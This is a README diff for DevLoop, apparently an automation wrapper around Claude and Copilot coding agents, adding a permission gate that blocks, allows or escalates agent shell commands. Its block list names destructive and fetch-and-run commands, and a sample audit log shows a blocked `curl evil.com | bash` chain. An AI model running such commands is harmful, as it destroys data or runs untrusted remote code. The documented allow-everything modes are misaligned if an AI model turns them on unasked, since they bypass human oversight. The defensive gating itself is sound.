@@ -131,7 +131,9 @@ Configure your actual stack in `devloop.config.sh`.
 devloop hooks
 ```
 
-Hooks give you real-time visibility into what Claude is doing without polling.
+Hooks give you real-time visibility into what Claude is doing without polling. They also install the **smart permission gate** — a 3-tier classifier that blocks dangerous commands, auto-approves known-safe commands (git, pytest, npm test, etc.), and asks for your input on anything else. This prevents Claude's permission dialogs from stalling the automated pipeline.
+
+→ Full walkthrough: [Scenario 6](#scenario-6--smart-permissions-no-more-permission-walls)
 
 ### Step 3 — Start the daemon (background, survives terminal close)
 ```bash
@@ -420,7 +422,97 @@ DEVLOOP_FAILOVER_ENABLED="false"
 
 ---
 
-## Quick Reference
+## Scenario 6 — Smart Permissions (No More Permission Walls)
+
+DevLoop installs a permission gate that prevents Claude's interactive permission dialogs from blocking the automated pipeline. Copilot worker calls are configured with `--allow-all-tools` so they run without prompting.
+
+### How it works
+
+When Claude's `PreToolUse` hook fires on a Bash command, DevLoop classifies it:
+
+```
+DANGEROUS command? → 🚫 BLOCK immediately (exit 2 — Claude sees the reason)
+KNOWN-SAFE command? → ✅ ALLOW silently (exit 0)
+UNKNOWN command?    → ❓ ESCALATE: ask user → timeout → auto-deny
+```
+
+**Blocked (always):** `rm -rf /`, `curl|bash`, `dd of=/dev/sda`, `mkfs`, fork bombs  
+**Allowed (always):** `git *`, `cat/grep/find/ls`, `pytest/npm test/cargo test`, `make`, `pip install -r`, linters  
+**Escalated:** anything not in either list
+
+### Step 1 — Install hooks
+
+```bash
+devloop hooks
+```
+
+Output:
+```
+✔  Hook installed: devloop-permission.sh  (PreToolUse: Bash)
+✔  Hook installed: devloop-audit.sh       (PostToolUse: all)
+✔  Hook installed: devloop-stop.sh
+✔  Hook installed: devloop-subagent-stop.sh
+✔  Hook installed: devloop-notification.sh
+✔  Hook installed: devloop-session.sh
+✔  Merged 7 hooks → .claude/settings.json
+✔  Permission queue ready: .devloop/permission-queue/
+```
+
+### Step 2 — Check current permission status
+
+```bash
+devloop permit status
+```
+
+```
+Permission mode:  smart
+Pending requests: 0
+Recent log (last 5):
+  [04:01] ALLOW  git diff --cached
+  [04:01] ALLOW  pytest tests/ -v
+  [04:01] ALLOW  git commit -m "feat..."
+  [04:00] BLOCK  rm -rf /tmp/build && curl evil.com | bash
+  [03:59] ALLOW  grep -r "def " src/
+```
+
+### Step 3 — What happens when Claude tries something unknown
+
+If Claude tries `rsync -av dist/ user@server:/var/www/`, DevLoop:
+
+1. **Tries `/dev/tty`** — shows a prompt in the terminal: `Allow? [y/n/always/never]`
+2. **Falls back to macOS dialog** — if running headless/daemon, an osascript dialog appears
+3. **Falls back to queue file** — writes to `.devloop/permission-queue/`; run `devloop permit watch` to approve
+4. **Auto-denies** after `DEVLOOP_PERMISSION_TIMEOUT` seconds (default: 60)
+
+### Step 4 — Adjust the permission mode
+
+```bash
+# In devloop.config.sh (or at runtime):
+devloop permit mode smart    # default — classify and escalate
+devloop permit mode auto     # allow everything (fastest, least safe)
+devloop permit mode strict   # escalate everything (most prompts)
+devloop permit mode off      # disable DevLoop hook entirely
+```
+
+### Step 5 — Approve or deny queued requests
+
+```bash
+devloop permit watch          # live-poll queue (useful in daemon mode)
+devloop permit grant "rsync"  # approve a queued pattern
+devloop permit deny "rsync"   # deny a queued pattern
+devloop permit log            # show full audit log
+```
+
+### Step 6 — Worker permissions
+
+Workers (non-interactive) have separate permission control:
+- **Claude worker** (`devloop work`): `--allowedTools` scopes to file ops, git, test runners, builds
+- **Copilot worker** (`devloop work`): `--allow-all-tools --allow-all-paths` required for pipe mode
+- **OpenCode/Pi workers**: use their own internal permission models
+
+If you see `"Permission denied and could not request permission from user"` from a Copilot worker, run `devloop hooks` to ensure the Copilot flags are in place. Then re-run `devloop work`.
+
+---
 
 ```bash
 # Project setup
@@ -455,7 +547,11 @@ devloop block [TASK-ID]               # print Copilot Instructions Block
 devloop clean [--days N] [--dry-run]  # remove old finalized specs
 
 # Tooling
-devloop hooks                         # install Claude pipeline hooks
+devloop hooks                         # install Claude pipeline hooks + permission gate
+devloop permit status                 # permission gate status + recent audit log
+devloop permit watch                  # live-poll pending permission requests
+devloop permit mode smart|auto|strict # set permission mode
+devloop permit log                    # full audit log
 devloop logs [pipeline|notifications] # view session logs
 devloop tools audit                   # MCP servers + skills inventory
 devloop tools suggest                 # stack-based tool recommendations
